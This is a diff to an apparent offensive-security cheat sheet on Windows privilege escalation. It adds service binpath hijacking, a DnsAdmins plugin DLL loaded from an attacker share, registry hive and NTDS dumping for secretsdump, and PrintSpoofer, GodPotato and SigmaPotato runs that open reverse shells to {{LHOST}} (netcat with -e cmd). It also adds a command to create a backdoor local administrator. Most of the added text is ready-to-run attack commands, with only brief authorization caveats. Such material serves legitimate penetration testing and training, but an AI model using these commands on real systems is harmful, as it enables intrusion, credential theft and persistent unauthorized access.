@@ -20,17 +20,111 @@ whoami /all
 
 Record current identity, groups and token privileges. A listed privilege alone does not prove an available escalation. [Microsoft whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami).
 
+## Privilege escalation decision
+
+Match the lead to the execution path before running a tool:
+
+- [ ] Identity and groups: `whoami /all`, privileged group membership, logon rights.
+- [ ] Token privileges: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeBackupPrivilege or SeLoadDriverPrivilege.
+- [ ] Service or task path: writable binary, configuration, arguments, dependency or trigger.
+- [ ] Application configuration: web.config, database files, scripts, history and transcripts.
+- [ ] Potato path: service-account shell with impersonation rights; test PrintSpoofer, GodPotato or SigmaPotato.
+- [ ] Automated sweep: run WinPEAS only after manual checks stall or to validate one concrete lead.
+
+```cmd
+whoami /all
+```
+
+## Server Operators service control
+
+Requires membership in Server Operators and a service the group can control. Validate the service name and current configuration before changing it.
+
+```cmd
+sc.exe config '{{SERVICE}}' binpath= "cmd /c {{COMMAND}}"
+net start '{{SERVICE}}'
+```
+
+Use a command that proves the resulting identity or returns useful output. Restore the original binary path when the objective requires it. [Microsoft sc config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config).
+
+## DnsAdmins plugin DLL
+
+Requires DnsAdmins membership or equivalent DNS service control. Host the DLL on a reachable share, validate the target DNS service, and expect a service restart to be required.
+
+```cmd
+dnscmd.exe /config /serverlevelplugindll '\\{{LHOST}}\share\dnsplugin.dll'
+net stop dns
+net start dns
+```
+
+Trigger a DNS operation that loads the plugin and verify the result. Remove the plugin configuration and restore DNS when required. [Microsoft dnscmd](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc772069(v=ws.11)).
+
+## Backup Operators registry and IFM
+
+Requires Backup Operators membership or equivalent backup rights. Save registry hives first; use IFM only when NTDS collection is authorized and disk space permits.
+
+```cmd
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+reg save HKLM\SECURITY security.hive
+ntdsutil.exe "activate instance ntds" "ifm" "create full C:\Windows\Temp\IFM" quit quit
+```
+
+Download the hives or IFM files, then run secretsdump locally. Remove staged files when required. [Microsoft reg save](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save), [Microsoft ntdsutil ifm](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732530(v=ws.11)).
+
 ## Impersonation escalation
 
-When `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled, the potato family usually escalates. Upload the chosen binary with an Evil-WinRM session, then run it on the target:
+When `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled — common for service accounts such as `iis apppool\defaultapppool` or `nt authority\network service` — escalate with the potato family. Upload the binary from an Evil-WinRM session, then run it on the target:
 
 ```powershell
-.\PrintSpoofer64.exe -i -c powershell.exe
-.\GodPotato.exe -cmd "cmd.exe"
-.\SigmaPotato.exe --revshell {{LHOST}} {{LPORT}}
+upload PrintSpoofer64.exe
+upload GodPotato.exe
 ```
 
 Match the binary to the target architecture and build; one failure does not rule out the others. Verify the result reports `nt authority\system`. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [GodPotato](https://github.com/BeichenDream/GodPotato), [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato).
+
+## PrintSpoofer
+
+`-i` starts the command on a new interactive console; without it the command runs non-interactively and output returns to the current shell:
+
+```powershell
+.\PrintSpoofer64.exe -i -c powershell.exe
+.\PrintSpoofer64.exe -c "cmd /c .\reverse.exe"
+```
+
+For a reverse shell, point `-c` at a prepared [Windows payload](shells/shells#windows-reverse-payload) or netcat and catch it on the [listener](shells/shells#listeners). [PrintSpoofer usage](https://github.com/itm4n/PrintSpoofer#usage).
+
+## GodPotato
+
+Run one command as SYSTEM, or chain a shell:
+
+```powershell
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\GodPotato.exe -cmd "cmd /c .\nc.exe {{LHOST}} 4444 -e cmd"
+```
+
+Quote the whole `-cmd` value; nested quotes break the call. [GodPotato](https://github.com/BeichenDream/GodPotato).
+
+## SigmaPotato
+
+A current all-in-one binary; hand it a command or ask for a reverse shell:
+
+```powershell
+.\SigmaPotato.exe "cmd /c whoami"
+.\SigmaPotato.exe --revshell {{LHOST}} 4444
+```
+
+[SigmaPotato](https://github.com/tylerdotrar/SigmaPotato).
+
+## Create a local administrator
+
+From SYSTEM or an administrator session, mint a new local admin — or promote the account you already own by skipping the first line:
+
+```powershell
+net user '{{USER}}' '{{PASS}}' /add
+net localgroup administrators '{{USER}}' /add
+```
+
+Group membership refreshes only on a new logon; reconnect WinRM afterwards. A local admin enables clean [remote dumping](active-directory/credential-dumping#secretsdump-remotely) and [pass-the-hash](active-directory/credential-access#pass-the-hash) reuse. [Microsoft net user](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-user), [net localgroup](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-localgroup).
 
 ## Automated enumeration
 
@@ -43,11 +137,11 @@ The C# build requires .NET 4.5.2 or newer. [WinPEAS requirements](https://github
 
 ### Host WinPEAS on Kali
 
-Run on Kali. Set LPORT to a free HTTP server port, such as 8000. Keep the server running.
+Run on Kali. Keep the HTTP server running on port 8000.
 
 ```bash
-cd /usr/share/peass/winpeas/
-python3 -m http.server {{LPORT}}
+cd /home/kali/tools/binaries
+python3 -m http.server 8000
 ```
 
 TODO: verify the local package path if that directory or winPEASx64.exe is missing.
@@ -57,7 +151,7 @@ TODO: verify the local package path if that directory or winPEASx64.exe is missi
 Run in the target's PowerShell session, in a writable directory. LHOST is Kali's IP reachable from the target's subnet.
 
 ```powershell
-iwr -UseBasicParsing -Uri 'http://{{LHOST}}:{{LPORT}}/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
+iwr -UseBasicParsing -Uri 'http://{{LHOST}}:8000/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
 ```
 
 This uses HTTP for the file transfer, including from an existing Evil-WinRM shell. [PowerShell download options](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-5.1).
@@ -97,3 +191,15 @@ schtasks /query /fo LIST /v
 ```
 
 Record task identity, action and trigger; check the action's file and directory ACLs. [Microsoft query options](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-query).
+
+## Privileged group and host-specific leads
+
+Use whoami /all and the local evidence before selecting a technique:
+
+- [ ] Server Operators: identify a controllable service, executable and restart capability.
+- [ ] DnsAdmins: verify the DNS service context and whether a plugin can be loaded; this normally applies to a DC running DNS.
+- [ ] Backup Operators or SeBackupPrivilege: look for readable SAM/SYSTEM hives and a viable ntds.dit backup path.
+- [ ] SeLoadDriverPrivilege: a usable signed vulnerable driver and compatible OS build are separate prerequisites.
+- [ ] Service accounts: check enabled SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege before choosing a potato variant.
+
+PrintNightmare and ZeroLogon are patch/build-specific checks, not default AD steps. Do not run them without matching version evidence and an authorized objective. [Microsoft whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami), [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview).
